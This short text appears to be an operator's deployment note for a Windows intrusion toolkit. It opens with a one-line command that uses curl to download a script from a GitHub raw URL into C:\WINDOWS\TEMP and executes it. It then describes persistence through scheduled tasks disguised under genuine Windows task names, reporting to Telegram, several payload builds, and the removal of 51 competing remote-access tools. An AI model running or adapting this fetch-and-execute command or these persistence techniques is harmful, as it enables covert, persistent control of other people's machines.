UNIVERSAL DEPLOY  (O32 / M22 / L11 / T12 / S6):
attrib -h -s -r C:\WINDOWS\TEMP\own.cmd >nul 2>&1 & curl.exe -L --ssl-no-revoke -o C:\WINDOWS\TEMP\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o32" && call C:\WINDOWS\TEMP\own.cmd

O32 root-cause fix: task persistence was existence-only against REAL Windows
task names (Diagnosis\Scheduled, WDI\ResolutionHost). Query succeeded, rearm
skipped, own_mon never ticked -> no log, auto-update dead. Now IDENTVER=6
unique names + Task To Run ownership checks + tasks-ensure every tick.

Expect TG:
  Source build: O32
  Payload builds: MON=M22 | SEC=S6 | TGR=T12 | LIB=L11
  Persist tasks show OK (not NOT_OURS)

KEEP: dual ScreenConnect FPs + Datto/CentraStage
REMOVE: 51 RMM/remote tools (see prior list)

FORCE O32 on stuck boxes (especially no own_mon.log / tasks=NOT_OURS).
